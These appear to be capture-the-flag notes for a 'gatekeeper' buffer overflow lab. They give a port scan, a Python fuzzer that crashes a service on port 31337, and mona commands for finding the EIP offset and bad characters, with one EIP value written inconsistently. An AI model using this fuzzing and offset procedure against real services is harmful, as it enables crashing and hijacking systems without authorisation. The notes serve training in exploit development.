# gatekeeper

* SCAN
```
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
3389/tcp  open  ms-wbt-server
31337/tcp open  Elite
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown
49155/tcp open  unknown
49161/tcp open  unknown
```

* FUZZ
```
#!/usr/bin/env python3

import socket, time, sys

ip = "127.0.0.1"

port = 31337
timeout = 5
prefix = ""
string = prefix + "A" * 150

while True:
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))

            print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
            s.send(bytes(string + '\n', 'utf8'))
            s.recv(1024)
    except Exception as e:
        print("Fuzzing crashed at {} bytes {}".format(len(string) - len(prefix), e))
        sys.exit(0)
    string += 10 * "A"
    time.sleep(1)
```

## Get offset
- Precise offset so that we can overwrite EIP with the offset + vals.
- Generate cyclic pattern of length 200
- `!mona findmsp -l 200`
- EIP offset 146
- or use EIP val - 36954138
```
thehive:exploit»./pattern_offset.rb -q 39654138
[*] Exact match at offset 146
```

!mona config -set workingfolder c:\mona\%p
!mona bytearray -b '\x00'
!mona compare -f C:\mona\gatekeeper\bytearray.bin -a 00af19e4


## MISC
* `!mona modules` to get additional info about program eg. ASLR status
* https://www.howtogeek.com/278056/what-is-aslr-and-how-does-it-keep-your-computer-secure/

